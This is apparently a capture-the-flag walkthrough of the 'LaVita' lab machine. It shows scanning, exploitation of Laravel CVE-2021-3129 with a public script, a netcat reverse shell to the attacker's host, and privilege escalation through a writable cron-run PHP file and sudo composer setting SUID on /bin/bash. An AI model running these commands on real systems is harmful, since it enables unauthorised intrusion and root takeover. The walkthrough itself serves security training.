---
icon: ubuntu
---

# LaVita - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.174.38 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 17:23 EDT
Nmap scan report for 192.168.174.38
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: W3.CSS Template
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   28.02 ms 192.168.45.1
2   27.93 ms 192.168.45.254
3   28.11 ms 192.168.251.1
4   28.39 ms 192.168.174.38
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

Upon exploring the website a discover that the contact form does not work and it redirects us to a 404 page revealing Laravel 8.4.0

<figure><img src="../../.gitbook/assets/image (2190).png" alt=""><figcaption></figcaption></figure>

If you click on send it will lead us to the below 404 page

<figure><img src="../../.gitbook/assets/image (2191).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2192).png" alt=""><figcaption></figcaption></figure>

Searchsploit reveals an RCE, however in order for the exploit to work it will require debug to be enabled and the log local path. I am gonna keep this in mind and try to run directory busting

#### <mark style="color:$primary;">Dirsearch</mark>

```
dirsearch -u http://192.168.174.38/
```

<figure><img src="../../.gitbook/assets/image (2195).png" alt=""><figcaption></figcaption></figure>

Dirsearch reveals a login and register page! Default creds do not work on the login page, i will have to register an account

<figure><img src="../../.gitbook/assets/image (2193).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2194).png" alt=""><figcaption></figcaption></figure>

We can set app\_debug to enabled from here! I am going to enable it and try the exploit I found earlier!

<figure><img src="../../.gitbook/assets/image (2196).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Laravel 8.4.0 RCE</mark>&#x20;

<figure><img src="../../.gitbook/assets/image (2197).png" alt=""><figcaption></figcaption></figure>

Now that We have debug mode enabled, I am going to check and see if <mark style="color:$info;">**/\_ignition/execute-solution**</mark> is accessible. The exploit needs to send a POST request to this url to get RCE

<figure><img src="../../.gitbook/assets/image (2198).png" alt=""><figcaption></figcaption></figure>

It is! Now I need to find the log file local path, after looking around the page, I could not find it.

I did find the root directory at <mark style="color:$info;">**/var/www/html/lavita**</mark>

The exploit, contains the default log file path: <mark style="color:$info;">**/var/www/html/laravel/storage/logs/laravel.log**</mark> I'll try to run it with the default path!

The Searchsploit version of the exploit did not work for me, I am going to try the one on [**Github**](https://github.com/joshuavanderpoll/CVE-2021-3129)

```
git clone https://github.com/joshuavanderpoll/CVE-2021-3129.git
```

```
python CVE-2021-3129.py
```

<figure><img src="../../.gitbook/assets/image (2199).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**Ok this exploit is not in perfect condition either, after every execution I need to stop the script and rerun it. I had to also revert the box!**</mark> <mark style="color:yellow;">**I did find out nc is on the machine. I am going to run the following commands to get a reverse shell after reverting the box**</mark>

```
python3 CVE-2021-3129.py --host="http://192.168.174.38"
```

```
execute nc 192.168.45.158 80 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (2200).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2201).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2202).png" alt=""><figcaption></figcaption></figure>

There might be some credentials for skunk somewhere, I am going to run linpeas in order to avoid wasting time!

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (2203).png" alt=""><figcaption></figcaption></figure>

skunk is in the sudo group! This leads me to believe we need to get a shell as root in order to escalate to root

<figure><img src="../../.gitbook/assets/image (2204).png" alt=""><figcaption></figcaption></figure>

I did find some DB credentials, but they lead me into a rabit hole there was nothing there! I am going to run [**pspy**](https://github.com/DominicBreuker/pspy/releases) next to see if there are any cronjobs running in the background!

### <mark style="color:$primary;">PSPY</mark>

```
timeout 3m ./pspy64
```

<figure><img src="../../.gitbook/assets/image (2205).png" alt=""><figcaption></figcaption></figure>

I found a cronjob running php on <mark style="color:$info;">**/var/www/html/lavita/artisan**</mark> as skunk

www-data owns that file, so I am going to create a php reverse shell!

<figure><img src="../../.gitbook/assets/image (2206).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Writable php script privesc -> skunk</mark>

I am going to use [**www.revshell.com**](https://www.revshells.com/) to create my shell and save it as artisan

<figure><img src="../../.gitbook/assets/image (2207).png" alt=""><figcaption></figcaption></figure>

Now I am going to prepare a listener, download and replace the artisan file, than wait for skunk to execute it.

<figure><img src="../../.gitbook/assets/image (2208).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2209).png" alt=""><figcaption></figcaption></figure>

Make sure to replace the artisan file!

<figure><img src="../../.gitbook/assets/image (2210).png" alt=""><figcaption></figcaption></figure>

now we wait for the file to get executed by skunk

<figure><img src="../../.gitbook/assets/image (2211).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Sudo Composer -> root</mark>

<figure><img src="../../.gitbook/assets/image (2212).png" alt=""><figcaption></figcaption></figure>

skunk can run composer as root! There is an easy solution available on [**GTFObins**](https://gtfobins.github.io/gtfobins/composer/#sudo)&#x20;

<figure><img src="../../.gitbook/assets/image (2213).png" alt=""><figcaption></figcaption></figure>

Instead of the command droping me into a root shell, I am going to make it at the SUID to /bin/bash!

```
echo '{"scripts":{"x":"chmod +s /bin/bash"}}' > composer.json
```

<figure><img src="../../.gitbook/assets/image (2214).png" alt=""><figcaption></figcaption></figure>

```
sudo -u root /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
```

<figure><img src="../../.gitbook/assets/image (2215).png" alt=""><figcaption></figcaption></figure>

And now we can get root by running bash -p to maintain the elevated privileges!
